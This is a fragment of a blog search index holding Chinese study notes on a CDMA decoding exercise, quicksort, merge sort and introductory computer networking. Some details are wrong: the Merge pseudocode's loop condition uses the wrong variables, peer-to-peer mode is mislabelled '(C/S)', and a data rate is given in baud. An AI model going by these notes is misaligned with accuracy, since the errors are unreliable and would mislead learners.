<pre><code>n：最高码元速率
a:16=2^4 则a=4
数据率=20000*4=80000码元/秒

共有四个站进行码分多址CDMA通信。四个站的码片序列为：
A：（-1，-1，-1，+1，+1，-1，+1，+1）
B：（-1，-1，+1，-1，+1，+1，+1，-1）
C：（-1，+1，-1，+1，+1，+1，-1，-1）
D：（-1，+1，-1，-1，-1，-1，+1，-1）

现收到这样的码片序列：(-1，+1，-3，+1，-1，-3，+1，+1)。问哪个站发送数据了？发送数据的站发送的是1还是0？

步骤：S：(-1，+1，-3，+1，-1，-3，+1，+1) 分别与A,B,C,D对应相乘再相加，最后的数再/8
如果最后的数为1，则发送1
如果最后的数为0，则没有发送
如果最后的数为-1，则发送0</code></pre><h2 id="三、思维导图"><a href="#三、思维导图" class="headerlink" title="三、思维导图"></a>三、思维导图</h2><p>   <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%89%A9%E7%90%86%E5%B1%82.png" alt="avatar"></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>日常学习</tag>
      </tags>
  </entry>
  <entry>
    <title>快速排序</title>
    <url>/2019/11/19/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<h1 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h1><h2 id="一、快排思想"><a href="#一、快排思想" class="headerlink" title="一、快排思想"></a>一、快排思想</h2><pre><code>快排其实就是冒泡的改进；主要思路就是划分元素——主元。
例如：3 5 2 7 9 0 1 4
    ___________________

    1 0 2| 3 |9 7 5 4

    左子序-|主元|-右子序

    1 0 2| 3 |9 7 5 4</code></pre><h2 id="二、步骤"><a href="#二、步骤" class="headerlink" title="二、步骤"></a>二、步骤</h2><pre><code>1.划分：选定一个记录作为主元，以主元为基准将整个序列划分为两个子序列
2.分别求解子问题
3.合并子问题</code></pre><h2 id="三、示例"><a href="#三、示例" class="headerlink" title="三、示例"></a>三、示例</h2><p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%BF%AB%E6%8E%920.png" alt="avatar"></p>
<h2 id="四、过程"><a href="#四、过程" class="headerlink" title="四、过程"></a>四、过程</h2><pre><code>1.初始化：取第一个记录作为基准，设置两个参数i,j分别指向将要与基准记录进行比较的左侧和右侧记录
2.右侧扫描，用基准记录与j指向的记录进行比较，重复此过程，直到右侧记录小结束，若i&lt;j,则将基准记录与j指向的记录进行交换
3.左侧扫描，用基准记录与i指向的记录进行比较，重复此过程，直到右侧的记录大结束，若i&lt;j,则将基准记录与i指向的记录进行交换
4.重复2，3步，直到i,j指向同一个位置</code></pre><h2 id="五、伪码"><a href="#五、伪码" class="headerlink" title="五、伪码"></a>五、伪码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Partition</span><span class="params">(<span class="keyword">int</span> r[],<span class="keyword">int</span> first,<span class="keyword">int</span> <span class="built_in">end</span>)</span></span>&#123;</span><br><span class="line">    i=first;j=<span class="built_in">end</span>; <span class="comment">//初始化</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">    	<span class="keyword">while</span>(i&lt;j&amp;&amp;r[i]&lt;=r[j]) j--; <span class="comment">//右侧扫描</span></span><br><span class="line">        <span class="keyword">if</span>(i&lt;j)&#123;</span><br><span class="line">        	r[i]&lt;--&gt;r[j]; <span class="comment">//将较小的记录交换到前面</span></span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j&amp;&amp;r[i]&lt;=r[j]) i++; <span class="comment">//左侧扫描</span></span><br><span class="line">        	<span class="keyword">if</span>(i&lt;j)&#123;</span><br><span class="line">            	r[j]&lt;--&gt;r[i]; <span class="comment">//将较大的记录交换到后面</span></span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    	<span class="keyword">return</span> i; <span class="comment">//i作为主元记录的最终位置</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(<span class="keyword">int</span> r[ ], <span class="keyword">int</span> first, <span class="keyword">int</span> <span class="built_in">end</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (first&lt;<span class="built_in">end</span>) &#123;      </span><br><span class="line">        pivot=Partition(r, first, <span class="built_in">end</span>);  </span><br><span class="line">          <span class="comment">//问题分解，pivot是主元（轴值）在序列中的位置</span></span><br><span class="line">        QuickSort(r, first, pivot<span class="number">-1</span>); </span><br><span class="line">          <span class="comment">//递归地对左侧子序列进行快速排序</span></span><br><span class="line">        QuickSort(r, pivot+<span class="number">1</span>, <span class="built_in">end</span>);</span><br><span class="line">          <span class="comment">//递归地对右侧子序列进行快速排序</span></span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="@时间复杂度"></a>@时间复杂度</h3><p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%BF%AB%E6%8E%921.png" alt="avatar"></p>
<pre><code>最坏情况：  O(n^2)</code></pre><p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%BF%AB%E6%8E%922.png" alt="avatar"></p>
<pre><code>平均情况：O(n*logn)</code></pre>]]></content>
      <categories>
        <category>算法设计</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>分治法</title>
    <url>/2019/11/19/%E5%88%86%E6%B2%BB%E6%B3%95/</url>
    <content><![CDATA[<h1 id="分治法"><a href="#分治法" class="headerlink" title="分治法"></a>分治法</h1><h2 id="一、分治思想"><a href="#一、分治思想" class="headerlink" title="一、分治思想"></a>一、分治思想</h2><pre><code>大问题分解为很多个子问题，最后合并</code></pre><h2 id="二、步骤："><a href="#二、步骤：" class="headerlink" title="二、步骤："></a>二、步骤：</h2><pre><code>1.划分子问题
2.求解子问题
3.合并子问题</code></pre><h2 id="三、归并："><a href="#三、归并：" class="headerlink" title="三、归并："></a>三、归并：</h2><pre><code>例子：
3 5 2 7 9 0 1 4
这里我们开辟出一个新的存放空间K,用两个指针i,j分别指向两个子问题的最开始元素；然后进行比较。最后变为：
2 3 5 7 | 0 1 4 9
再将这两个有序的子问题用相同的方法进行合并即可。 这就是归并的思想</code></pre><h2 id="四、伪码："><a href="#四、伪码：" class="headerlink" title="四、伪码："></a>四、伪码：</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort</span><span class="params">(<span class="keyword">int</span> r[],<span class="keyword">int</span> r1[],<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L==R) r1[L]=r[L]; <span class="comment">//只有一个元素，直接赋值</span></span><br><span class="line">   		<span class="keyword">else</span>&#123;</span><br><span class="line">        	m=(L+R)/<span class="number">2</span>;</span><br><span class="line">          Mergesort(r,r1,L,m);	<span class="comment">//归并排序前半个子序列</span></span><br><span class="line">          Mergesort(r,r1,m+<span class="number">1</span>,R); <span class="comment">//归并排序后半个子序列</span></span><br><span class="line">      		 Merge(r1,r,L,m,R); <span class="comment">//合并两个已排序的子序列</span></span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(<span class="keyword">int</span> r[],<span class="keyword">int</span> r1[],<span class="keyword">int</span> L,<span class="keyword">int</span> m,<span class="keyword">int</span> R)</span></span>&#123;</span><br><span class="line">    	i=L;j=m+<span class="number">1</span>;k=L;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;=m&amp;&amp;j&lt;=t)&#123;</span><br><span class="line">        	<span class="keyword">if</span>(r[i]&lt;=r[j]) r1[k++]=r[i++];</span><br><span class="line">            <span class="keyword">else</span> r1[k++]=r[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;=m) <span class="keyword">while</span>(i&lt;=m)</span><br><span class="line">        	r1[k++]=r[i++];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">while</span>(j&lt;=R)</span><br><span class="line">        	r1[k++]=r[j++];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="@时间复杂度"></a>@时间复杂度</h3><pre><code>T（N）=O(n*logn)</code></pre><h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="@空间复杂度"></a>@空间复杂度</h3><pre><code>O(n)</code></pre><h2 id="五、图解"><a href="#五、图解" class="headerlink" title="五、图解"></a>五、图解</h2><p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%88%86%E6%B2%BB0.png" alt="avatar"></p>
<p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%88%86%E6%B2%BB1.png" alt="avatar"></p>
]]></content>
      <categories>
        <category>算法设计</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>第一章-绪论</title>
    <url>/2019/11/18/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%BB%AA%E8%AE%BA/</url>
    <content><![CDATA[<h1 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章-绪论"></a>第一章-绪论</h1><h2 id="主要知识"><a href="#主要知识" class="headerlink" title="主要知识"></a>主要知识</h2><pre><code>熟悉的网络有三大类：电信网络，有线电视网络和计算机网络

计算机网络的主要功能是：资源共享和数据通信（具有连通信和共享性）

计算机网络的组成：由若干结点和连接它们的链路组成

ARPANET是互联网的雏形

internet(互连网)是一个通用名词，泛指多个计算机网络互相连接的计算机网阔

Internet(互联网）是一个专有名词，指全球目前最大的，开放的互连网

ISP:互联网服务提供商（移动，电信，联通）</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/ISP%E6%A6%82%E5%BF%B5%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"></p>
<pre><code>*互联网的拓扑结构虽然非常复杂，但是按照工作方式分，可以分为：
边缘部分和核心部分

边缘部分：由所有连接在互联网上的主机组成，用户可以直接使用（资源共享和数据通信）
核心部分：由网络和连接这些网络的路由器组成，为边缘部分提供服务</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%A0%B8%E5%BF%83%E8%BE%B9%E7%BC%98%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"></p>
<pre><code>网络边缘的通信方式通常可以划分为两大类：客户-服务器方式（C/S）和对等方式（C/S）

关于两者的区别：
前者强调服务者与被服务者的关系，后者没有，后者其实就是前者的双向应用</code></pre><p>   <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/CS%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"><br>   <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%AF%B9%E7%AD%89%E8%BF%9E%E6%8E%A5%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"></p>
<pre><code>   核心部分起特殊作用的是：路由器；作用是存储转发

边缘部分和核心部分的工作方式是什么？

边缘部分由连接在互联网上的主机组成，用户可以直接使用资源共享，数据通信
核心部分由网络和连接网络的路由器组成，核心部分的工作方式其实就是路由器的工作方式，即存储转发

交换技术分别有哪几种？它们的区别是什么？

交换技术主要有电路交换，报文交换，分组交换；
电路交换将报文的比特流连续从源点直达重点，像在管道中传送
报文交换是整个报文先到相邻节点，全部存储下来之后再查找转发表，进行转发
分组交换其实就是将报文交换中的报文拆分为多个分组，存储转发</code></pre><p> <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"></p>
<pre><code> 计算机网络按范围分：
广域网（WAN），城域网（MAN）,局域网(LAN)，个人区域网(PAN)

按用户分：
专用网和公用网

计算机网络性能指标：
速率，带宽，时延，时延带宽积，吞吐量，往返时间RTT，利用率

速率：数据传输的速率
带宽：表示某通道传输数据的能力
时延：分为发送时延，传播时延，处理时延和排队时延
时延带宽积：时延*带宽
吞吐量：单位时间内，通过某网络的实际数据量
往返时间RTT：从发送开始计时直到发送方收到接收方的确认
利用率：信道的利用率

计算机网络体系结构，最有名的是两种：OSI参考模型和TCP/IP的四层协议</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png" alt="avatar"></p>
<h2 id="部分习题："><a href="#部分习题：" class="headerlink" title="部分习题："></a>部分习题：</h2><pre><code>C/S和P2P的主要区别是什么？有什么相同的地方？
前者强调服务者与被服务者的关系，后者没有，后者其实就是前者的双向应用

计算机网络有哪些常用的性能指标？
速率，带宽，吞吐量，时延，时延带宽积，往返时间RTT,利用率

网络协议的三要素是什么？有什么含义？
语法：即数据与控制信息的结构或格式
语义：即需要发出何种控制信息，完成何种动作
同步：即事件发生的顺序</code></pre><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BB%AA%E8%AE%BA.png" alt="avatar"></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>日常学习</tag>
      </tags>
  </entry>
</search>
